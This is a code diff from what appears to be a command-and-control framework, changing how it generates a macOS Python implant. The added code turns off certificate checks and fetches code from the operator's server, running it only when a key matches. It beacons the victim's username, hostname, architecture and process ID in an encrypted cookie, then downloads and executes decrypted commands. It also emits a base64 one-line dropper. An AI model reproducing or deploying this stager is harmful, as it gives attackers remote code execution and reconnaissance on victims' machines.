@@ -26,8 +26,12 @@ class Payloads(object):
     self.Referer = Referer
     self.ConnectURL = ConnectURL
     self.BaseDirectory = BaseDirectory
-    self.Python = """import urllib2,os,base64,ssl,socket,pwd;from Crypto.Cipher import AES;ssl._create_default_https_context = ssl._create_unverified_context;un = pwd.getpwuid( os.getuid() )[ 0 ];pid = os.getpid();is64 = sys.maxsize > 2**32; arch = ('x64' if is64 == True else 'x86');hn = socket.gethostname(); o = urllib2.build_opener();o.addheaders.append(('Cookie', 'SessionID=%%s;%%s;%%s;%%s;%%s;' %% (un,hn,hn,arch,pid)));response = o.open('%s'); html = response.read(); iv = html[0:16]; aes = AES.new(base64.b64decode('%s'), AES.MODE_CBC, iv); data = (aes.decrypt(base64.b64decode(html))).rstrip('\\0'); exec(data[16:])
-    """ % ((self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.Key)
+    self.PythonKey = gen_key()
+    self.Python = """import urllib2,os,sys,base64,ssl,socket,pwd;ssl._create_default_https_context = ssl._create_unverified_context;pykey='%s';key='%s';o=urllib2.build_opener();a=o.open("%s");b=a.read(); 
+if pykey in b: exec(b); 
+else: sys.exit(0);
+un = pwd.getpwuid( os.getuid() )[ 0 ];pid = os.getpid();is64 = sys.maxsize > 2**32; arch = ('x64' if is64 == True else 'x86');hn = socket.gethostname(); o = urllib2.build_opener();encsid = encrypt(key, '%%s;%%s;%%s;%%s;%%s;' %% (un,hn,hn,arch,pid));o.addheaders.append(('Cookie', 'SessionID=%%s' %% encsid));response = o.open('%s'); html = response.read(); x=decrypt(key, html).rstrip('\\0'); exec(x)
+    """ % (self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"))
     self.C2Core = """%s
 $sc="%s"
 $s="%s"
@@ -297,10 +301,21 @@ ao.run('%s', 0);window.close();
     output_file.write(cs)
     output_file.close()
 
+  def CreatePythonAES(self):
+    randomkey = self.PythonKey
+    with open("%saes.py" % FilesDirectory, 'rb') as f:
+      content = f.read()
+    aespy = content.replace("#REPLACEKEY#","#%s" % randomkey)
+    filename = "%saes.py" % (self.BaseDirectory)
+    output_file = open(filename, 'w')
+    output_file.write(aespy)
+    output_file.close()
+
   def CreatePython(self, name=""):
     self.QuickstartLog( ""+Colours.END )
     self.QuickstartLog( "OSX Python Payload:"+Colours.GREEN )
     py = base64.b64encode(self.Python)
+    #print self.Python
     pydropper = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % py
     self.QuickstartLog( pydropper )
 
